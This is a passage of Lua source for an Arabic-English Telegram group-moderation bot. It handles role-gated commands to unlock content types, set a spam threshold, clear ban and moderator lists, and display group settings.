                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الصوت • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
                end
                database:del('bot:voice:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ voice is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الصوت سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "links" or unmutepts[2] == "الروابط" then
              if database:get('bot:links:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock links ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الروابط • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:links:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ links is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الروابط سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "location" or unmutepts[2] == "المواقع" then
              if database:get('bot:location:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock location ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح المواقع • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:location:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ location is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح المواقع سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "tag" or unmutepts[2] == "المعرف" then
              if database:get('tags:lock'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock tag ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح المعرف • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
                end
                database:del('tags:lock'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ tag is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح المعرف سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "strict" or unmutepts[2] == "الحمايه" then
              if database:get('bot:strict'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock strict ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الحمايه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:strict'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ strict is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الحمايه سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "hashtag" or unmutepts[2] == "الهاشتاك" then
              if database:get('bot:hashtag:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock hashtag ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الهاشتاك • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
                end
                database:del('bot:hashtag:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ hashtag is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الهاشتاك سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "contact" or unmutepts[2] == "الجهات" then
              if database:get('bot:contact:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock contact ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الجهات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
                end
                database:del('bot:contact:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ contact is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الجهات سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "webpage" or unmutepts[2] == "الشبكات" then
              if database:get('bot:webpage:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock webpage ☑️', 1, 'md')
                else
                 local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الشبكات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:webpage:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ webpag is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الشبكات سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "arabic" or unmutepts[2] == "العربيه" then
              if database:get('bot:arabic:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock arabic ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح العربيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:arabic:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ arabic is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح العربيه سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "english" or unmutepts[2] == "الانكليزيه" then
              if database:get('bot:english:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock english ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الانكليزيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 60, string.len(msg.sender_user_id_))
                end
                database:del('bot:english:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ english is already unlocked ✔️', 1, 'md')
                else
                 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الانكليزيه سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "tgservice" or unmutepts[2] == "الاشعارات" then
              if database:get('bot:tgservice:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock tgservice ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الاشعارات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 59, string.len(msg.sender_user_id_))
                end
                database:del('bot:tgservice:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ tgservice is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الاشعارات سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "sticker" or unmutepts[2] == "الملصقات" then
              if database:get('bot:sticker:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock sticker ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الملصقات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
                end
                database:del('bot:sticker:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ sticker is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الملصقات سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "fwd" or unmutepts[2] == "التوجيه" then
              if database:get('bot:forward:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock fwd ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح التوجيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:forward:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ fwd is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح التوجيه سابقا ✔️', 1, 'md')
                end
              end
            end
          end
        end
        ------------------------------------faeder-----------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ss]etspam (%d+)$") then
            local sensspam = {string.match(text, "^([Ss]etspam) (%d+)$")}
            if tonumber(sensspam[2]) < 40 then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Enter a number greater than 40 •', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '??⁞ اختر عدد اكبر من 40 حرف •', 1, 'md')
              end
            else
              database:set('bot:sens:spam'..msg.chat_id_,sensspam[2])
              if not database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع عدد الاحرف '..sensspam[2]..' •\n🚦⁞ اذا كانت الرساله فيها اكثر من '..sensspam[2]..' حرف •\n🚦⁞ انا سوف اقوم بحذفها •', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n🚦⁞ Sentences have over '..sensspam[2]..' character will delete •', 1, 'md')
              end
            end
          end
          if text:match("^ضع عدد الاحرف (%d+)$") then
            local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
            if tonumber(sensspam[2]) < 40 then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Enter a number greater than 40 •', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اختر عدد اكبر من 40 حرف •', 1, 'md')
              end
            else
              database:set('bot:sens:spam'..msg.chat_id_,sensspam[2])
              if not database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع عدد الاحرف '..sensspam[2]..' •\n🚦⁞ اذا كانت الرساله فيها اكثر من '..sensspam[2]..' حرف •\n🚦⁞ انا سوف اقوم بحذفها •', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n🚦⁞ Sentences have over '..sensspam[2]..' character will delete •', 1, 'md')
              end
            end
          end
        end
        -----------------
        
        -----------------------------------------------------------------------------------------------
        if is_sudo(msg) then
          if text:match("^[Ee]dit (.*)$") then
            local editmsg = {string.match(text, "^([Ee]dit) (.*)$")}
            edit(msg.chat_id_, msg.reply_to_message_id_, nil, editmsg[2], 1, 'html')
          end
          if text:match("^تعديل (.*)$") then
            local editmsgs = {string.match(text, "^(تعديل) (.*)$")}
            edit(msg.chat_id_, msg.reply_to_message_id_, nil,editmsgs[2], 1, 'html')
          end
        end
        -----------------------------------------------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Cc]lean (.*)$") or text:match("^مسح (.*)$") then
            local txt = {string.match(text, "^([Cc]lean) (.*)$")}
            local txts = {string.match(text, "^(مسح) (.*)$")}
            if txt[2] == 'banlist' or txts[2] == 'المحظورين' then
              database:del('bot:banned:'..msg.chat_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Banlist has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح المحظورين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 36, string.len(msg.sender_user_id_))
              end
            end
            if is_sudo(msg) then 
              if txt[2] == 'banalllist' or txts[2] == 'قائمه العام' then
                database:del('bot:gban:')
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Banalllist has been cleared •', 1, 'md')
                else
                  local faeder = '🚦⁞ تم مسح قائمه العام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 38, string.len(msg.sender_user_id_))
                end
              end
            end
            if is_leader(msg) then 
              if txt[2] == 'dev3' or txts[2] == 'مطورين الرتبه الثالثه' then
                database:del('bot:admins:')
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Banalllist has been cleared •', 1, 'md')
                else
                  local faeder = '🚦⁞ تم مسح مطورين الرتبه الثالثه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 48, string.len(msg.sender_user_id_))
                end
              end
            end
            if txts[2] == 'البوتات' then
        local botslist = function(extra, result)
         local list = result.members_
          for i = 0, #list do
          if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
           end 
           end
           end
            local faeder = '🚦⁞ تم مسح البوتات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 34, string.len(msg.sender_user_id_))
        getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
             end
            if txt[2] == 'modlist' or txts[2] == 'الادمنيه' then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح الادمنيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 35, string.len(msg.sender_user_id_))
              end
              database:del('bot:momod:'..msg.chat_id_)
            end
            if txt[2] == 'donky list' or txts[2] == 'المطايه' then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح المطايه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 34, string.len(msg.sender_user_id_))
              end
              database:del('bot:donky:'..msg.chat_id_)
            end
            if txt[2] == 'voplist' or txts[2] == 'الاعضاء المميزين' then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ VIP Members list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح الاعضاء المميزين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 43, string.len(msg.sender_user_id_))
              end
              database:del('bot:vipmem:'..msg.chat_id_)
            end
            if txt[2] == 'filterlist' or txts[2] == 'قائمه المنع' then
              local hash = 'bot:filters:'..msg.chat_id_
              database:del(hash)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Filterlist has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح قائمه المنع • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 38, string.len(msg.sender_user_id_))
              end
            end
            if txt[2] == 'mutelist' or txts[2] == 'المكتومين' then
              database:del('bot:muted:'..msg.chat_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Muted users list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح المكتومين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 36, string.len(msg.sender_user_id_))
              end
            end
          end
        end
        if is_admin(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Cc]lean (.*)$") or text:match("^مسح (.*)$") then
            local txt = {string.match(text, "^([Cc]lean) (.*)$")}
            local txts = {string.match(text, "^(مسح) (.*)$")}
            if txt[2] == 'Filter all list' or txts[2] == 'قائمه المنع العام' then
              local hash = 'bot:freewords:'
              database:del(hash)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Freelist has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح قائمه المنع العام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 44, string.len(msg.sender_user_id_))
              end
            end
            if txt[2] == 'owners' or txts[2] == 'المدراء' then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ owner list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح المدراء • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 34, string.len(msg.sender_user_id_))
              end
              database:del('bot:owners:'..msg.chat_id_)
            end
            if txt[2] == 'monsh' or txts[2] == 'المنشئين' then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ monsh list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح المنشئين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 35, string.len(msg.sender_user_id_))
              end
              database:del('bot:monsh:'..msg.chat_id_)
            end
            if txt[2] == 'momod all' or txts[2] == 'الادمنيه العامين' then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod all list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح الادمنيه العامين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 43, string.len(msg.sender_user_id_))
              end
              database:del('bot:moall:')
            end
            if txt[2] == 'vip all' or txts[2] == 'المميزين عام' then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ vip all list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح المميزين عام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 39, string.len(msg.sender_user_id_))
              end
              database:del('bot:owners:'..msg.chat_id_)
            end
            if txt[2] == 'ownerall' or txts[2] == 'المدراء العامين' then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod list has been cleared •', 1, 'md')
              else
                local faeder = '🚦⁞ تم مسح المدراء العامين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 42, string.len(msg.sender_user_id_))
              end
              database:del('bot:onall:')
            end
            end
            end
        ------------------------------faeder-----------------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ss]ettings$") or text:match("^الاعدادات$") then
            if database:get('bot:muteall'..msg.chat_id_) then
              mute_all = 'مفعل 🚩'
            else
              mute_all = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:text:mute'..msg.chat_id_) then
              mute_text = 'مفعل 🚩'
            else
              mute_text = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:photo:mute'..msg.chat_id_) then
              mute_photo = 'مفعل 🚩'
            else
              mute_photo = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:video:mute'..msg.chat_id_) then
              mute_video = 'مفعل 🚩'
            else
              mute_video = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:gifs:mute'..msg.chat_id_) then
              mute_gifs = 'مفعل 🚩'
            else
              mute_gifs = 'معطل 📍'
            end
            ------------faeder
            if database:get('anti-flood:'..msg.chat_id_) then
              mute_flood = 'مفعل 🚩'
            else
              mute_flood = 'معطل 📍'
            end
            ------------faeder
            if not database:get('flood:max:'..msg.chat_id_) then
              flood_m = 5
            else
              flood_m = database:get('flood:max:'..msg.chat_id_)
            end
            ------------faeder
            if not database:get('bot:sens:spam'..msg.chat_id_) then
              spam_c = 250
            else
              spam_c = database:get('bot:sens:spam'..msg.chat_id_)
            end
            ------------faeder
            if database:get('floodstatus'..msg.chat_id_) == "DelMsg" then
              floodstatus = "بالمسح 🚩"
            elseif database:get('floodstatus'..msg.chat_id_) == "Kicked" then
              floodstatus = "بالطرد 📍"
            elseif not database:get('floodstatus'..msg.chat_id_) then
              floodstatus = "بالمسح 🚩"
            end
            ----------------------------------------------------faeder
            if database:get('bot:music:mute'..msg.chat_id_) then
              mute_music = 'مفعل 🚩'
            else
              mute_music = 'معطل 📍'
            end
            ------------faedee
            if database:get('bot:bots:ban'..msg.chat_id_) then
              mute_bots = 'مفعل 🚩'
            else
              mute_bots = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:inline:mute'..msg.chat_id_) then
              mute_in = 'مفعل 🚩'
            else
              mute_in = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:cmds'..msg.chat_id_) then
              mute_cmd = 'مفعل 🚩'
            else
              mute_cmd = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:voice:mute'..msg.chat_id_) then
              mute_voice = 'مفعل 🚩'
            else
              mute_voice = 'معطل 📍'
            end

            ------------faeder
            if database:get('editmsg'..msg.chat_id_) then
              mute_edit = 'مفعل 🚩'
            else
              mute_edit = 'معطل 📍'
            end

            ------------faeder
            if database:get('bot:links:mute'..msg.chat_id_) then
              mute_links = 'مفعل 🚩'
            else
              mute_links = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:pin:mute'..msg.chat_id_) then
              lock_pin = 'مفعل 🚩'
            else
              lock_pin = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:sticker:mute'..msg.chat_id_) then
              lock_sticker = 'مفعل 🚩'
            else
              lock_sticker = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:tgservice:mute'..msg.chat_id_) then
              lock_tgservice = 'مفعل 🚩'
            else
              lock_tgservice = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              lock_wp = 'مفعل 🚩'
            else
              lock_wp = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:strict'..msg.chat_id_) then
              strict = 'مفعل 🚩'
            else
              strict = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              lock_htag = 'مفعل 🚩'
            else
              lock_htag = 'معطل 📍'
            end
            ------------faeder
            if database:get('tags:lock'..msg.chat_id_) then
              lock_tag = 'مفعل 🚩'
            else
              lock_tag = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:location:mute'..msg.chat_id_) then
              lock_location = 'مفعل 🚩'
            else
              lock_location = 'معطل 🎈'
            end
            ------------faeder
            if database:get('bot:contact:mute'..msg.chat_id_) then
              lock_contact = 'مفعل 🚩'
            else
              lock_contact = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:english:mute'..msg.chat_id_) then
              lock_english = 'مفعل 🚩'
            else
              lock_english = 'معطل 📍'
            end
            ------------fader
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              lock_arabic = 'مفعل 🚩'
            else
              lock_arabic = 'معطل 📍'
            end
            ------------fader
            if database:get('bot:forward:mute'..msg.chat_id_) then
              lock_forward = 'مفعل 🚩'
            else
              lock_forward = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:document:mute'..msg.chat_id_) then
              lock_file = 'مفعل 🚩'
            else
              lock_file = 'معطل ??'
            end
            ------------faeder
            if database:get('markdown:lock'..msg.chat_id_) then
              markdown = 'مفعل 🚩'
            else
              markdown = 'معطل 📍'
            end
            ------------faeder
            if database:get('bot:spam:mute'..msg.chat_id_) then
              lock_spam = 'مفعل 🚩'
            else
              lock_spam = 'معطل 📍'
            end
            ------------faeder
            if database:get("bot:welcome"..msg.chat_id_) then
              send_welcome = 'مفعل 🚩'
            else
              send_welcome = 'معطل 📍'
            end
            ------------faeder
            local TXTAR = "🎖⁞ اعدادات المجموعه 🔻 :\n\n"
            .."🚦⁞ قفل الحمايه • "..strict.."\n"
            .."🚦⁞ قفل الكل • "..mute_all.."\n"
            .."🚦⁞ قفل الشارحه • "..mute_cmd.."\n\n"
            .."🎖⁞ اعدادات اخرى:🔻 :\n\n"
            .."🚦⁞ قفل الكلايش • "..lock_spam.."\n"
            .."🚦⁞ قفل الروابط • "..mute_links.."\n"
            .."️🚦⁞ قفل الشبكات • "..lock_wp.."\n"
            .."🚦⁞ قفل المعرف • "..lock_tag.."\n"
            .."🚦⁞ قفل الهاشتاك • "..lock_htag.."\n"
            .."🚦⁞ قفل التوجيه • "..lock_forward.."\n"
            .."🚦⁞ قفل البوتات •  "..mute_bots.."\n"
            .."🚦⁞ قفل العديل •  "..mute_edit.."\n"
            .."🚦⁞ قفل التثبيت • "..lock_pin.."\n"
            .."🚦⁞ قفل الاونلاين • "..mute_in.."\n"
            .."🚦⁞ قفل العربيه •  "..lock_arabic.."\n"
            .."🚦⁞ قفل الانكليزيه • "..lock_english.."\n"
            .."🚦⁞ قفل الماركداون • "..markdown.."\n"
              .."️🚦⁞ قفل الاشعارات • "..lock_tgservice.."\n"
            .."🚦⁞ قفل التكرار • "..mute_flood.."\n"
            .."🚦⁞ خاصيه التكرار • "..floodstatus.."\n"
            .."??⁞ عدد التكرار • [ "..flood_m.." ]\n"
            .."️🚦⁞ عدد السبام • [ "..spam_c.." ]\n\n"
            .."🎖⁞ المزيد من الاعدادات 🔻 :\n\n"
            .."🚦⁞ قفل الدردشه • "..mute_text.."\n"
            .."🚦⁞ قفل الصور • "..mute_photo.."\n"
            .."🚦⁞ قفل الفيديو • "..mute_video.."\n"
            .."🚦⁞ قفل المتحركه • "..mute_gifs.."\n"
            .."🚦⁞ قفل الاغاني • "..mute_music.."\n"
            .."🚦⁞ قفل الصوت • "..mute_voice.."\n"
